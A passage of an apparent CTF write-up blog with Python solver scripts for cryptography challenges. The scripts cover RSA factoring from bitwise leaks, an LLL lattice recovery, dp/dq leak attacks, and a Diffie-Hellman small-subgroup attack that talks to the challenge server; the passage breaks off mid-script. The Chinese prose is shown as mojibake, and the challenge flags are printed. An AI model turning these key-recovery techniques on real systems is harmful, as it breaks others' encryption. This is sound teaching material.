taa.append(aa * maskn // <span class="number">2</span> + a[j])</span><br><span class="line">                            tbb.append(bb * maskn // <span class="number">2</span> + b[j])</span><br><span class="line">        maskx *=<span class="number">2</span></span><br><span class="line">        maskn *=<span class="number">2</span></span><br><span class="line">        a = taa</span><br><span class="line">        b = tbb    </span><br><span class="line">    <span class="keyword">for</span> a1 <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> n % a1 == <span class="number">0</span>:</span><br><span class="line">            a = a1</span><br><span class="line">            b = n // a1</span><br><span class="line">            <span class="keyword">return</span> (a, b)</span><br><span class="line"></span><br><span class="line">n = <span class="number">63120390892038750887847461212137040846704453211463265124088247545754312909837242226152058559207778569326068784340376246107925344102854168054443821037690461228791503321988302424090363482607836706365716231863738321800643576803292579959548768477931467808594444063300816720312065088031447797672611719109123926239</span></span><br><span class="line">gift1 = <span class="number">2385461434719459675562566881073828933585886412514716007230911437507375182798354514754165824354200037212465668388408285187557836674548425959460199610595902</span> </span><br><span class="line">p, q = get_ab(n, gift1)</span><br><span class="line"><span class="built_in">print</span>((p, q))</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒéƒ¨åˆ†å·²çŸ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n=p*q</span><br><span class="line">gift2=p&amp;q</span><br><span class="line">r</span><br><span class="line">hint=r&amp;p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"></span><br><span class="line">n = <span class="number">93899765081968741114399338082060700714089719856698986175805549984340129441941421395981845491950791787870474182813636477629502110929918956137136867242460527687030071329164361410584600939158530651519926042817999136505129771699307676089507450754103038735606641122120818166235760047614963540804850422418490477659</span></span><br><span class="line">gift2 = <span class="number">6966395449196911707833712967500828532527151128771194603454228921546168541592707085037132087811259181214320142366226858749933163854591572996639598075748353</span></span><br><span class="line">hint = <span class="number">7240944669338895524418912841205778829555887307297768405304274268439119352600195766649103260157973074311461377198863505197570057277455381244145663410208801</span></span><br><span class="line">r = <span class="number">8111787345250251057692785321966070041332427916220343651851811461173532961090460473378180177611236949759482523141243578738065293199789541629807332557571043</span></span><br><span class="line"></span><br><span class="line">cands = [<span class="number">1</span>]  <span class="comment"># p å¿…ä¸ºå¥‡æ•°</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">513</span>):</span><br><span class="line">    mod = <span class="number">1</span> &lt;&lt; i</span><br><span class="line">    mask = mod - <span class="number">1</span></span><br><span class="line">    new = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> p0 <span class="keyword">in</span> cands:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">            p1 = p0 | (b &lt;&lt; (i - <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                inv = <span class="built_in">pow</span>(p1, -<span class="number">1</span>, mod)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            q1 = (n * inv) % mod</span><br><span class="line">            <span class="keyword">if</span> ((p1 &amp; q1) == (gift2 &amp; mask)) <span class="keyword">and</span> ((r &amp; p1) == (hint &amp; mask)):</span><br><span class="line">                new.add(p1)</span><br><span class="line">    cands = <span class="built_in">list</span>(new)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cands:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;æ— å€™é€‰ï¼Œå‡ºé”™äºç¬¬ <span class="subst">&#123;i&#125;</span> ä½&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å€™é€‰æ•°é‡:&quot;</span>, <span class="built_in">len</span>(cands))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> cands:</span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;éªŒè¯:&quot;</span>, p*q == n, (p&amp;q)==gift2, (r&amp;p)==hint, isPrime(p), isPrime(q))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>SYC&#123;hahaha_th1_factor_is_N0t_ha16&#125;</code></p><p>â€‹</p><h3 id="ezLLL"><a href="#ezLLL" class="headerlink" title="ezLLL"></a>ezLLL</h3><blockquote><p>èˆ¹æ–°å‚æœ¬,æ¬¢è¿æ¥ç©.</p><p>hint: æ³¨æ„ï¼šflag ä¸­åŒ…å«é ASCII å­—ç¬¦ï¼Œè§£ç æ—¶è¯·æ³¨æ„å­—ç¬¦ç¼–ç é—®é¢˜ã€‚ æŸäº›ç¯å¢ƒå¯èƒ½æ˜¾ç¤ºä¸ºè½¬ä¹‰åºåˆ—ï¼ˆå¦‚ <code>\xe1</code>ï¼‰ï¼Œè¿™å®é™…ä¸Šæ˜¯ <code>Ã¡</code> å­—ç¬¦çš„æ­£å¸¸è¡¨ç¤ºã€‚</p></blockquote><p>å°†flagç¼–ç æˆbase64ï¼Œç„¶ååˆ†æˆä¸‰éƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†é•¿åº¦åˆ†åˆ«ä¸º12ã€24å’Œ36å­—èŠ‚ï¼Œæ€»é•¿åº¦72å­—èŠ‚ã€‚</p><p>å·²çŸ¥ï¼š</p><p>c0, c1, c2ï¼šä¸‰ä¸ª 500 ä½å¤§æ•´æ•°ï¼ˆçº¦ 2^500ï¼‰</p><p><code>c4 = c0*x0 + c1*x1 + c2*x2</code></p><p>x0 æ˜¯ 12 å­—èŠ‚ â†’ 96 ä½ â†’ x0 &lt; 2^96</p><p>x1 æ˜¯ 24 å­—èŠ‚ â†’ 192 ä½ â†’ x1 &lt; 2^192</p><p>x2 æ˜¯ 36 å­—èŠ‚ â†’ 288 ä½ â†’ x2 &lt; 2^288</p><p>ä» c4 å’Œ c æ¢å¤å‡º x0, x1, x2ï¼Œå†æ‹¼æ¥è¿˜åŸ flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix, Rational, floor</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gram_schmidt</span>(<span class="params">b</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(b)</span><br><span class="line">    bstar = [<span class="literal">None</span>] * n</span><br><span class="line">    mu = [[Rational(<span class="number">0</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    bstar[<span class="number">0</span>] = b[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">        bstar[i] = b[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            mu[i][j] = Rational( (b[i] * bstar[j].T)[<span class="number">0</span>,<span class="number">0</span>] , (bstar[j] * bstar[j].T)[<span class="number">0</span>,<span class="number">0</span>] )</span><br><span class="line">            bstar[i] = bstar[i] - mu[i][j] * bstar[j]</span><br><span class="line">    <span class="keyword">return</span> bstar, mu</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lll</span>(<span class="params">M</span>):</span><br><span class="line">    b = [M.row(i).copy() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    n = <span class="number">3</span></span><br><span class="line">    delta = Rational(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        bstar, mu = gram_schmidt(b)</span><br><span class="line">        <span class="comment"># size reduction</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">abs</span>(mu[k][j]) &gt; Rational(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">                    q = floor(mu[k][j] + Rational(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">                    b[k] = b[k] - q * b[j]</span><br><span class="line">        <span class="comment"># update gs</span></span><br><span class="line">        bstar, mu = gram_schmidt(b)</span><br><span class="line">        swapped = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">            left = (bstar[k] * bstar[k].T)[<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">            right = (delta - mu[k][k-<span class="number">1</span>]**<span class="number">2</span>) * (bstar[k-<span class="number">1</span>] * bstar[k-<span class="number">1</span>].T)[<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> left &lt; right:</span><br><span class="line">                b[k], b[k-<span class="number">1</span>] = b[k-<span class="number">1</span>], b[k]</span><br><span class="line">                swapped = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> swapped:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Matrix(b)</span><br><span class="line"></span><br><span class="line">c0 = <span class="number">3038112798633297184662383622304935743085885557233749158956007073849612482288376427868177129794650629723820320354956421200731057248206923390266126724749</span></span><br><span class="line">c1 = <span class="number">3067905676575976394191697470198775983424017171927789349465114051806662220809274519404690237600876120098160925189141020955735592394058043223836997390364</span></span><br><span class="line">c2 = <span class="number">161718305745223416862626464966392423773787018933651874103999525456915447775033958634175772362315345532256900450737279647892731432357809002698314267166</span></span><br><span class="line">c4 = <span class="number">28062790413629718933986669054186703589109523209003558087731275662743174344133808251212801549266309585389771008410013425648388045766331470112982955563124028892325281968496755965862457760066899153866340566596633175020232648844383549331469</span></span><br><span class="line"></span><br><span class="line">D = <span class="number">2</span> ** <span class="number">288</span></span><br><span class="line">P1 = <span class="number">2</span> ** <span class="number">96</span></span><br><span class="line">P2 = <span class="number">1</span></span><br><span class="line">P3 = <span class="number">2</span> ** <span class="number">192</span></span><br><span class="line">M = Matrix([</span><br><span class="line">[P1, <span class="number">0</span>, <span class="number">0</span>, c1 * D],</span><br><span class="line">[<span class="number">0</span>, P2, <span class="number">0</span>, c2 * D],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, P3, c0 * D]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">reduced = lll(M)</span><br><span class="line">b = [reduced.row(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">bstar, mu = gram_schmidt(b)</span><br><span class="line">t = Matrix([[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, c4 * D]])</span><br><span class="line">n = <span class="number">3</span></span><br><span class="line">c = [<span class="number">0</span>] * n</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    q = Rational( (t * bstar[i].T)[<span class="number">0</span>,<span class="number">0</span>] , (bstar[i] * bstar[i].T)[<span class="number">0</span>,<span class="number">0</span>] )</span><br><span class="line">    sum_mu = Rational(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, n):</span><br><span class="line">        sum_mu += mu[j][i] * Rational(c[j])</span><br><span class="line">    c[i] = floor(q - sum_mu + Rational(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">lattice_point = Matrix([[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    lattice_point += c[i] * b[i]</span><br><span class="line">x1 = <span class="built_in">int</span>(lattice_point[<span class="number">0</span>,<span class="number">0</span>] // P1)</span><br><span class="line">x2 = <span class="built_in">int</span>(lattice_point[<span class="number">0</span>,<span class="number">1</span>] // P2)</span><br><span class="line">x0 = <span class="built_in">int</span>(lattice_point[<span class="number">0</span>,<span class="number">2</span>] // P3)</span><br><span class="line">sum_check = c0 * x0 + c1 * x1 + c2 * x2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sum_check == c4:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">    parts0 = x0.to_bytes(<span class="number">12</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    parts1 = x1.to_bytes(<span class="number">24</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    parts2 = x2.to_bytes(<span class="number">36</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    flag_b64_bytes = parts0 + parts1 + parts2</span><br><span class="line">    flag_b64 = flag_b64_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    flag = base64.b64decode(flag_b64)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sum_check - c4)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># SYC&#123;5@y_h31Lo_t0_The_1enstra-Lenstra-LovÃ¡sz_4lgor!7hm&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Disclose"><a href="#Disclose" class="headerlink" title="Disclose"></a>Disclose</h3><blockquote><p>You should find what diseclse and what else has question</p><p>hint: Check each individual piece of data I provide,does it meet the requirements of the password CTF challengeï¼Ÿ</p></blockquote><p>ç±»ä¼¼ dp_spill é‚£é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">259787328713315620669972878133037988076215916550647711246939676477326421129812013679655754313165138535008411950313861029496051740521361999159396760989834909603081600363947357112748647883977394670486758972444444439142111569713941555128481912069206288996136103241520037293009874925975282333163541887307464845637591763227092634236013041271880254215362783937683868306313993128035189967091568339765295122704805004687960409586156492514826705669219883130894837499370163894909020869677997529751680238466436501721265413943262568271164547660870177889287883337700613985620882071517309593058133486504491987638053802704885406321489</span>   </span><br><span class="line">dq = <span class="number">22499014253625008930376465290523079246236903672491529428949946205185543555249003236181305161565081242391920797396454563137397269152501398025721057979839815010145158362677658875505461725215023623199075647605873076372373127281663691994250233620145698675916320588215123270286378681617192723590595528629007323619</span></span><br><span class="line">c = <span class="number">6370053764427872753918916672520952591890815345305784661535167250636567614044442456829951926201367031691890397266551896051506485503559355632977037940932465451673402461276283344898143212429679842407935863578100874434864110951261893629193556575965754852130079804129027545776519410420168588918897574771225807265360467679437166130735732969205196853246138265462918730868587864117597334192701298070798102481475959547503973860672351511772559847970384102048811464809463784622382282732625019306431797575127684452390281458642683831354534593808201093823305835131373576894519989150022396180064841804679779794213399320560860722616</span>    </span><br><span class="line">e_high = <span class="number">1217218333594918008784773594710739821599287411350951048190189539176815103546142818696781454251773183601401149085966947779641557137128602392</span></span><br><span class="line"></span><br><span class="line">e = e_high &gt;&gt; <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(isPrime(e))</span><br><span class="line">g = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dq, n) - <span class="number">2</span>, n)</span><br><span class="line"><span class="comment"># g = 11 * 167245394008464567861812328427149020666461356914028493259431704768339925310965623643795443928230806489877572022934499691331745436765143986473454476830544964945952741990867637846804372779244702129049503593272379258269763241792078971066297389807672403305526697135230662605730770468080048292619442099725740721573</span></span><br><span class="line"></span><br><span class="line">q = g // <span class="number">11</span></span><br><span class="line">p = n // q // <span class="number">11</span></span><br><span class="line"><span class="built_in">print</span>(p.bit_length())</span><br><span class="line"><span class="built_in">print</span>(q.bit_length())</span><br><span class="line"><span class="built_in">print</span>(p * q == n // <span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, f)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n//<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;H1gh_0rder_attack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="dp-spill"><a href="#dp-spill" class="headerlink" title="dp_spill"></a>dp_spill</h3><blockquote><p>Oops, Not Your Usual dp!</p></blockquote><p>dpå°ï¼Œçˆ†ç ´ï¼Œå¯¹ä»»æ„ $r$ï¼Œæœ‰ $g=\gcd(r^{e \cdot dp - 1} - 1, n)$ï¼Œæå¤§æ¦‚ç‡å°±æ˜¯ $p$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">n = <span class="number">59802493250926859707985963604065644706006753432029457979480870189591634515944547801582044132550574140049396756158974108666587177618882259807156459782125677704143102175791607852135852403246382056816004306499712131698646815738798243056590111291799398438023345030391834782966046976995917844819454047154287312391</span></span><br><span class="line">e = <span class="number">55212884840887233646138079973875295799093171847359460085387084716906818593689341421818829383370282800231404248386041253598996862719171485530961860941585382910224531768283026267484780257269526617362183903996384696040145787076592207619279689647074176697837752679360230601598541884491676076657287130000027117241</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> dp <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">    p = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dp, n) - <span class="number">2</span>, n)</span><br><span class="line">    <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(dp)</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        <span class="built_in">print</span>(q)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;SYC&#123;&#123;<span class="subst">&#123;sha256(<span class="built_in">str</span>(p+q).encode()).hexdigest()&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># SYC&#123;644684707c540998d760975fb98a816a469ec567abe5c8004164d3ce887c6a8e&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="simple-DH"><a href="#simple-DH" class="headerlink" title="simple-DH"></a>simple-DH</h3><blockquote><p>æ¥åˆ°çš„æˆéƒ½,p å¤ä¼¼ä¹ä¸å¤ªå®‰å…¨,flagå¼€å¤´æ˜¯syc</p></blockquote><p>é€‰æ‹©é€‰é¡¹1ï¼ŒæœåŠ¡å™¨è¿”å›Cï¼ˆå¯†æ–‡ï¼‰å’ŒA1 = g^a mod pã€‚</p><p>Key = A1^b mod pï¼Œm = C âŠ• Keyã€‚</p><p>è®¡ç®—p-1çš„å› å­ï¼Œå–å°ç´ å› å­çš„ä¹˜ç§¯çº¦ä¸º2^{128}ï¼Œå¤§äº2^{100}ï¼ˆbçš„ä¸Šç•Œï¼‰ï¼Œå› æ­¤æ¢å¤b mod æ¯ä¸ªå°qåï¼Œå¯ç”¨CRTå¾—åˆ°å®Œæ•´çš„bã€‚</p><p>è¿›å…¥é€‰é¡¹2ï¼Œæ¢å¤b mod æ¯ä¸ªqï¼š</p><p>é€‰æ‹©é€‰é¡¹2ï¼Œè¿›å…¥å¾ªç¯äº¤äº’ï¼ˆæœ€å¤š2^16æ¬¡ï¼‰ã€‚</p><p>å¯¹äºæ¯ä¸ªå°ç´ æ•°qï¼Œè®¡ç®—h = pow(2, (p-1)//q, p)ï¼ˆhçš„é˜¶ä¸ºqï¼‰ã€‚</p><p>å¯¹äºkä»0åˆ°q-1é€ä¸ªå°è¯•ï¼Œå‘é€g1 = hã€‚</p><p>æ¥æ”¶æœåŠ¡å™¨è¿”å›çš„A = h^aâ€™ mod pï¼ˆaâ€™ä¸ºæœåŠ¡å™¨éšæœº80ä½æ•°ï¼Œä¸”A â‰  1ï¼‰ã€‚</p><p>è®¡ç®—supposed_key = pow(A, k, p)ã€‚</p><p>å‘é€ykey = supposed_keyã€‚</p><p>æ¥æ”¶å“åº”ï¼š</p><p>å¦‚æœâ€ok_keyâ€ï¼Œåˆ™b â‰¡ k mod qï¼Œè®°å½•å¹¶è·³åˆ°ä¸‹ä¸€ä¸ªqã€‚</p><p>å¦‚æœâ€no_keyâ€ï¼Œç»§ç»­ä¸‹ä¸€ä¸ªkã€‚</p><p>ç”±äºqæœ€å¤§ä¸º1013ï¼Œæ€»å°è¯•æ¬¡æ•°è¿œå°äº2^{16}ã€‚</p><p>ä½¿ç”¨CRTè®¡ç®—bï¼š</p><p>æ”¶é›†æ‰€æœ‰å¯¹ (q, k) ï¼Œå…¶ä¸­b â‰¡ k mod qã€‚</p><p>ä½¿ç”¨CRTæ±‚è§£b mod (small_primesçš„ä¹˜ç§¯)ï¼Œå¾—åˆ°bï¼ˆå› ä¸ºb &lt; ä¹˜ç§¯ï¼‰ã€‚</p><p>æœ€åè§£å¯†flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">remainders, modulus</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    pro = prod(modulus)</span><br><span class="line">    <span class="keyword">for</span> m_i, r_i <span class="keyword">in</span> <span class="built_in">zip</span>(modulus, remainders):</span><br><span class="line">        p = pro // m_i</span><br><span class="line">        s += r_i * (inverse(p,m_i)*p)</span><br><span class="line">    <span class="keyword">return</span> s % pro</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&#x27;127.0.0.1&#x27;,1608)</span></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>,<span class="number">30861</span>)</span><br><span class="line">T = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;number \n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>,timeout=T)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;cipher flag=&#x27;</span>)</span><br><span class="line">C = <span class="built_in">eval</span>(r.recvline(timeout=T))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;A1=&#x27;</span>)</span><br><span class="line">A1 = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;.&#x27;</span>,timeout=T)[:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;C = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;A1 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">p = <span class="number">162005261169344318401566230104702503064642137782409884504384217600032351339</span></span><br><span class="line"></span><br><span class="line"><span 